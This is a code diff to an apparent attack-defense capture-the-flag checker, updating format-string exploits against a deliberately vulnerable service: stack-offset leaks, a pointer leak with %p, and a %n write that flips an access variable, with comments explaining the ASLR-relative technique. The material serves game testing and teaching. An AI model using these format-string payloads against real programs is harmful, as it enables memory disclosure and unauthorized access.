@@ -384,7 +384,7 @@ async def exploit_treasure(task: ExploitCheckerTaskMessage, searcher: FlagSearch
     await conn.reader.readuntil(b": ")
 
     # Send the format string exploit as the password
-    conn.writer.write(b'%22$llx.%23$llx\n') # TODO: %31$llx.%32$llx locally, find out why?
+    conn.writer.write(b'%43$llx.%44$llx\n') # NOTE: Could differ on the vulnbox (because of x86?)
     await conn.writer.drain()
 
     # Read the buffer to get the incorrect password message
@@ -512,8 +512,8 @@ async def getflag_private(
 
 
 # Relative positions on the stack from the stack dump for 2nd exploit (will be the same regardless of ASLR)
-reference_variable_pos = 0x3150
-access_variable_pos = 0x192c
+reference_variable_pos = 0x1c38
+access_variable_pos = 0x003c
 
 @checker.exploit(1)
 async def exploit_private(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger: LoggerAdapter) -> Optional[str]:
@@ -532,17 +532,17 @@ async def exploit_private(task: ExploitCheckerTaskMessage, searcher: FlagSearche
 
     # 2. Set identity and loot to get the address of the access variable
 
-    # Recall that the address space is randomized for each run of the program due to ASLR, but relative positions are the same
-    # The stack dump shows that the variable at %1575$ stores the address to a nearby position on the stack
-    # We can see that this address is at +0x3150 from the stack pointer $sp
-    # We also see that the address storing the access variable is at +0x192c
-    # We can use this information to calculate the address of the access variable
+    # Note that the address space is randomized for each run of the program due to ASLR, but relative positions are the same
+    # The stack dump shows that the variable at %488$ stores the absolute address to a nearby position on the stack
+    # We call the pointed to location the reference variable, and note it is +0x1c38 from the stack pointer $sp
+    # We also see that the address storing the access variable is at +0x003c
+    # We can use this information to calculate the absolute address of the access variable
     # To ensure the string is 64 bytes long, we can pad it with 'a's
     # We also wrap the pointer in = to make it easier to extract from the response
     conn.writer.write(f'identity\n'.encode())
     await conn.writer.drain()
     await conn.reader.readuntil(b": ")
-    new_identity = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=%1575$p='
+    new_identity = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=%488$p='
     conn.writer.write(new_identity + b'\n')
     await conn.writer.drain()
     await conn.reader.readuntil(b"$ ")
@@ -566,14 +566,14 @@ async def exploit_private(task: ExploitCheckerTaskMessage, searcher: FlagSearche
     # 3. Set identity and loot to write a truthy value to the access variable
 
     # We will this time input the address of the access variable when prompted for a password during the loot command
-    # From the stack dump we can deduce that input at this prompt is stored at %54$
-    # Now that we know the address of the access variable will be stored at %54$ we can use %n
-    # %54$n will take the count of the characters in front of it and write this value to the address stored at %54$
+    # From the stack dump we can deduce that input at this prompt is stored at %75$
+    # Now that we know the address of the access variable will be stored at %75$ we can use %n
+    # %75$n will take the count of the characters in front of it and write this value to the address stored at %75$
     # Voila! We have written a truthy value to the access variable
     conn.writer.write(f'identity\n'.encode())
     await conn.writer.drain()
     await conn.reader.readuntil(b": ")
-    new_identity = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%54$n'
+    new_identity = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%75$n'
     conn.writer.write(new_identity + b'\n')
     await conn.writer.drain()
     await conn.reader.readuntil(b"$ ")
